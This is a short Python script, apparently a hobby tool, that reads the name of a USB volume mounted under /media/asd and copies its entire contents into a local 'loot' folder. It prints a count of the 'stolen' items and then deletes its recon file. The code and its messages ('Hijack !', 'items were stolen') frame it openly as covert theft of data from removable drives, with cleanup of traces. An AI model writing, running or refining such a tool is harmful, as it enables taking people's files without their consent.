# import libs
import shutil as sh
import os

# media path
path = "/media/asd"

# the recon file path
recon_file = "/home/asd/recon_usb_name.txt"

# get volume name and save it into a txt file ==> [ recon_usb_name.txt ]
def recon_and_check():
        list_pilots = os.listdir(path)
        for index , i in enumerate(list_pilots):
            with open("/home/asd/recon_usb_name.txt" , "w") as masar :
                masar.write(f"{i}")

# remove recon file after hijacking
def rm_recon():
    if os.path.exists("/home/asd/loot"):
        os.system(f"rm {recon_file}")

#count_stolen_items
def count():
    with open("/home/asd/recon_usb_name.txt" , "r") as masar :
        masar_read_lines = masar.readlines()
        volume_path = (f"{masar_read_lines[0]}")
    count_path = os.listdir("/home/asd/loot")

    for index , item in enumerate(count_path , start=1):
        padded_index = str(index).zfill(2)
        print (f"[{padded_index}] - {item}")
    print (f"[{index}] item(s) were stolen from {volume_path} (Main Folder)")

# Hijack !
def hijack():
    if os.path.exists(recon_file):
        with open("/home/asd/recon_usb_name.txt" , "r") as masar :
            masar_read_lines = masar.readlines()
            volume_path = (f"{path}/{masar_read_lines[0]}")
            try :
                sh.copytree(src=volume_path , dst="/home/asd/loot")
                print ("Done")
                count()
                rm_recon()
            except FileExistsError :
                print ("We've Already Done that")
                rm_recon()
    else :
        print ("No Blood Bag to Absorb ")


# call functions
recon_and_check()
hijack()
